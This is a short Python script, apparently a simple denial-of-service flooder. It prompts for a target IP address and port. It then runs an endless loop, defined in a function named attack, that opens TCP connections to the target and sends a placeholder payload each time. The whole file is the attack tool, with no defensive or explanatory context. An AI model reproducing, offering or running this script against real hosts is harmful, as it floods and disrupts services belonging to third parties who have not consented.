import socket

ip = input("Target IP address: ")
port = int(input("Port number: "))

def attack():
    sock = socket.socket()
    sock.connect((ip ,port))
    sock.send(("Data to be sent").encode())
    sock.close()

while True:
    attack()
